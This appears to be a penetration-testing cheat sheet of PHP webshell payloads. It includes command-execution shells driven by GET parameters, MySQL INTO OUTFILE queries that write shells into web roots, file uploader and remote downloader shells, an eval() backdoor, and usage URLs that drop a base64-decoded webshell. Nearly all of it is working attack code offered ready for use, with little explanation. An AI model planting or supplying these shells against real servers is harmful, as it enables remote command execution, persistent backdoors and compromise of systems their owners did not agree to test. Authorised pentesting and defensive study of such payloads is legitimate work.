# Webshells Payloads

## 01 - Simple Webshells

Tiny webshell

```php
<?=`$_GET[0]`?>
```

Basic webshell with HTML input form

```php
<html>
    <body>
        <form method="get" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
            <input type="text" name="cmd" autofocus id="cmd" size="80">
            <input type="submit" value="Execute">
        </form>
        <pre>
            <?php
            if(isset($_GET["cmd"])) {
                echo system($_GET["cmd"] . " 2&<1");          
            }
            ?>
        </pre>
    </body>
</html>
```

## 02 - Oneliners

### 2.1 - MySQL

```sql
SELECT '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';

SELECT '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE 'C:\\inetpub\\wwwroot\\phpmyadmin\\config\\shell.php';

SELECT '<HTML><BODY><FORM METHOD="GET" NAME="myform" ACTION=""><INPUT TYPE="text" NAME="cmd"><INPUT TYPE="submit" VALUE="Send"></FORM><pre><?php if($_GET["cmd"]) {​​system($_GET["cmd"]);}​​ ?> </pre></BODY></HTML>' INTO OUTFILE '/var/www/html/shell.php'
```

### 2.3 - Uploader

Simple PHP uploader

`$ cat uploader.php`

---

```php
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>File Upload</title>
    </head>
    <body>
        <h2>File Upload</h2>
        <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST" enctype="multipart/form-data">
            <input type="file" name="fileToUpload" id="fileToUpload">
            <input type="submit" value="Upload" name="submit">
        </form>

        <?php
        if (isset($_POST['submit'])) {
            if (!empty($_FILES['fileToUpload']['name'])) {
                $targetDir = './'; // Upload to the same directory as the PHP script
                $targetFile = $targetDir . basename($_FILES['fileToUpload']['name']);

                if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $targetFile)) {
                    echo "File uploaded successfully.";
                } else {
                    echo "Sorry, there was an error uploading your file.";
                }
            } else {
                echo "Please choose a file to upload.";
            }
        }
        ?>
    </body>
</html>
```

One liner PHP code.

```php
<?php if(isset($_POST['submit'])){$t='./';$f=$t.basename($_FILES['fileToUpload']['name']);if(move_uploaded_file($_FILES['fileToUpload']['tmp_name'],$f))echo"File uploaded successfully.";else echo"Sorry, there was an error uploading your file.";}?> <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>File Upload</title></head><body><h2>File Upload</h2><form action="<?=$_SERVER['PHP_SELF']?>" method="POST" enctype="multipart/form-data"><input type="file" name="fileToUpload" id="fileToUpload"><input type="submit" value="Upload" name="submit"></form></body></html>
```

SQL Query for reference.

```sql
SELECT '<?php if(isset($_POST[\'submit\'])){$t=\'./\';$f=$t.basename($_FILES[\'fileToUpload\'][\'name\']);if(move_uploaded_file($_FILES[\'fileToUpload\'][\'tmp_name\'],$f))echo"File uploaded successfully.";else echo"Sorry, there was an error uploading your file.";}?>\n<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"><title>File Upload</title></head><body><h2>File Upload</h2><form action=\"<?=$_SERVER[\'PHP_SELF\']?>\" method=\"POST\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"fileToUpload\" id=\"fileToUpload\"><input type=\"submit\" value=\"Upload\" name=\"submit\"></form></body></html>' INTO OUTFILE '/var/www/html/uploader.php'
```

PHP uploader with table view

```php
<!-- https://community.netwitness.com/t5/netwitness-community-blog/from-sql-injection-to-webshell/ba-p/521012 -->
<!DOCTYPE html>
<html>
	<head>
	    <title>File Upload</title>
	</head>
	<body>
	    <form enctype="multipart/form-data" method="POST">
	        File: <input name="file" type="file"><br>
	        <input type="submit" value="Upload">
	    </form>
	
	    <?php
	    if (!empty($_FILES["file"])) {
	        $file = $_FILES["file"];
	        if ($file["error"] > 0) {
	            echo "Error: {$file['error']}<br>";
	        } else {
	            echo "Stored file: {$file['name']}<br>Size: " . ($file["size"] / 1024) . " kB<br>";
	            move_uploaded_file($file["tmp_name"], $file["name"]);
	        }
	    }
	
	    $dirArray = array_filter(scandir("."), function($entry) { return $entry[0] !== "."; });
	    $indexCount = count($dirArray);
	    echo "$indexCount files<br><table border=1 cellpadding=5 cellspacing=0 class=whitelinks><tr><th>Filename</th><th>Filetype</th><th>Filesize</th></tr>";
	
	    foreach($dirArray as $entry) {
	        echo "<tr><td><a href=\"$entry\">$entry</a></td><td>" . filetype($entry) . "</td><td>" . filesize($entry) . "</td></tr>";
	    }
	
	    echo "</table>";
	    ?>
	</body>
</html>
```

One liner PHP code

```php
<!DOCTYPE html><html><head><title>File Upload</title></head><body><form enctype="multipart/form-data" method="POST">File: <input name="file" type="file"><br><input type="submit" value="Upload"></form><?php if (!empty($_FILES["file"])) {$file = $_FILES["file"];if ($file["error"] > 0) {echo "Error: {$file['error']}<br>";} else {echo "Stored file: {$file['name']}<br>Size: " . ($file["size"] / 1024) . " kB<br>";move_uploaded_file($file["tmp_name"], $file["name"]);}$dirArray = array_filter(scandir("."), function($entry) { return $entry[0] !== "."; });$indexCount = count($dirArray);echo "$indexCount files<br><table border=1 cellpadding=5 cellspacing=0 class=whitelinks><tr><th>Filename</th><th>Filetype</th><th>Filesize</th></tr>";foreach($dirArray as $entry) {echo "<tr><td><a href=\"$entry\">$entry</a></td><td>" . filetype($entry) . "</td><td>" . filesize($entry) . "</td></tr>";}echo "</table>";?></body></html>
```

### 2.4 - Downloader

```php
<?php fwrite(fopen($_GET[f], 'w'), file_get_contents($_GET[u])); ?>
```

SQL Query for reference.

```sql
SELECT '<?php fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>' INTO OUTFILE '/var/www/html/downloader.php'
```

### 2.5 - Evaluate PHP Code

```php
<?php eval($_GET[evaluate]); ?>
```

#### 2.5.1 - MySQL

SQL Query for reference.

```sql
SELECT '<?php eval($_GET[evaluate]); ?>' INTO OUTFILE '/var/www/html/eval_php.php'
```

#### 2.5.2 - Usage

Gather PHP Version

```
http[s]://<URL>//eval_php.php?evaluate=phpinfo();
```

Base64 encoded

```
http[s]://<URL>//eval_php.php?evaluate=if(file_put_contents('webshell.php', base64_decode(<base64_encoded>))){ echo 1;} else {echo 2;}
```

## 03 - Laudanum

You can navigate to `/usr/share/laudanum` or `/usr/share/webshells` based on what pentest distro you have or you can clone it on github.

## 04 - SecurityNotFound

```
$ git clone --depth=1 https://github.com/CosasDePuma/SecurityNotFound.git /opt/webshells/SecurityNotFound/
```

---
## References

- [Webshell](https://oscp.infosecsanyam.in/shells/webshell)

- [p0wny-shell](https://github.com/flozz/p0wny-shell)

- [Archive-Puma: SecurityNotFound](https://github.com/Archive-Puma/SecurityNotFound)

- [SecLists: WebShells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells/PHP)